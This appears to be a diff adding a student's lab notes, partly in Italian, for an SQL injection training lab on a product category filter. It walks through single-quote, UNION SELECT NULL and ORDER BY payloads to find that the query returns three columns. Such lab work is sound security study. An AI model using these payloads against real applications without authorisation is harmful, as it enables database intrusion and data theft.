@@ -1,0 +1,64 @@
+This lab contains an SQL injection vulnerability in the product category filter.
+The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
+The first step of such an attack is to determine the number of columns that are being returned by the query.
+You will then use this technique in subsequent labs to construct the full attack.
+
+To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values.
+
+
+IPOTETICA STRUTTURA QUERY SQL
+
+SELECT * FROM categoryTable WHERE category = 'Gifts';
+
+
+
+1) SELECT category FROM categoryTable WHERE category = 'Gifts';
+''
+= SELECT category FROM categoryTable WHERE category = 'Gifts'''; 
+
+NESSUNA MODIFICA NELLA RISPOSTA. UN SOLO APICE ROMPE LA QUERY.
+POSSIBILE PUNTO PER SQL INJECTION.
+
+2) SELECT category FROM categoryTable WHERE category = 'Gifts';
+' UNION SELECT NULL--
+= SELECT category FROM categoryTable WHERE category = 'Gifts' UNION SELECT NULL--';
+
+ERRORE NELLA RISPOSTA: internal server error.
+
+
+3) SELECT category FROM categoryTable WHERE category = 'Gifts';
+' UNION SELECT NULL,NULL--
+= SELECT category FROM categoryTable WHERE category = 'Gifts' UNION SELECT NULL,NULL--';
+
+ERRORE NELLA RISPOSTA: internal server error.
+
+4) SELECT category FROM categoryTable WHERE category = 'Gifts';
+' UNION SELECT NULL,NULL,NULL--
+= SELECT category FROM categoryTable WHERE category = 'Gifts' UNION SELECT NULL,NULL,NULL--';
+
+NESSUN ERRORE NELLA RISPOSTA.
+
+
+5) SELECT category FROM categoryTable WHERE category = 'Gifts';
+' ORDER BY 1--
+= SELECT category FROM categoryTable WHERE category = 'Gifts' ORDER BY 1--';
+
+NESSUN ERRORE. QUINDI ESISTE ALMENO 1 COLONNA
+
+6) SELECT category FROM categoryTable WHERE category = 'Gifts';
+' ORDER BY 2--
+= SELECT category FROM categoryTable WHERE category = 'Gifts' ORDER BY 2--';
+
+NESSUN ERRORE. QUINDI ESISTONO ALMENO 2 COLONNE
+
+7) SELECT category FROM categoryTable WHERE category = 'Gifts';
+' ORDER BY 3--
+= SELECT category FROM categoryTable WHERE category = 'Gifts' ORDER BY 3--';
+
+NESSUN ERRORE. QUINDI ESISTONO ALMENO 3 COLONNE
+
+8) SELECT category FROM categoryTable WHERE category = 'Gifts';
+' ORDER BY 4--
+= SELECT category FROM categoryTable WHERE category = 'Gifts' ORDER BY 4--';
+
+ERRORE! NON ESISTONO 4 COLONNE MA SOLO 3.
